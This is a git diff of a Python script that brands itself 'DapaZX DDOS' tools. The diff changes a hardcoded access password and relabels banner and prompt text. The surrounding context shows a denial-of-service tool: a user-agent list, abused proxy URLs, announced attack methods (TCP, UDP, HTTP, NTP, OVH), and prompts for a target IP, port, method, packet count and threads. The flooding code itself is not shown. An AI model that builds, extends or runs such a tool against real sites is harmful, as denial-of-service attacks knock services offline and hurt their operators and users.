@@ -25,21 +25,21 @@ magenta = '\033[1;35;40m'
 cyan = '\033[1;36;40m'
 white = '\033[1;37;40m'
 
-pasw = "dapa"
+pasw = "ZX"
 
 for i in range(3):
     pwd = input(" Password : ")
     j = 3
     if (pwd == pasw):
         time.sleep(3)
-        print("[0] try to connect \n")
+        print("[ZX] connect \n")
         break
     else:
         time.sleep(2)
-        print("[x] Password wrong \n")
+        print("[ZX] Password wrong \n")
         continue
 time.sleep(2)
-print("[0] login berhasil")
+print("[ZX] connected")
 time.sleep(2)
 
 useragents = [
@@ -4160,20 +4160,20 @@ http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPAS
     'http://eu.battle.net/wow/en/search?q=',
 ]
 
-print("------------------------------------------------")
-print("[1;34;40m' Tools Created By DapaZX")
-print("[+] Use Tools DapaZX DDOS")
+print("========================")
+print("[ZX] Tools Created By DapaZX")
+print("[ZX] Use Tools DapaZX DDOS")
 print("")
-print("[+] TESTING TOOLS!!")
-print("[+]attack website ON")
-print("[+]attack GTPS ON")
-print("[-] BOOST || TCP || UDP || HTTP || DDOS || JETX || OVH || NTP")
-print("------------------------------------------------")
+print("[ZX] TESTING TOOLS!!")
+print("[ZX]attack website ON")
+print("[ZX]attack GTPS ON")
+print("[ZX] BOOST || TCP || UDP || HTTP || DDOS || JETX || OVH || NTP")
+print("=========================")
 ip = str(input(" IP / DOMAIN : "))
 port = int(input(" PORT : "))
 method = str(input(" Method : "))
-times = int(input(" PACKETS : "))
-threads = int(input(" THREADS : "))
+times = int(input(" Packet : "))
+threads = int(input(" Threads : "))
 
 print(""" 
 Checking IP
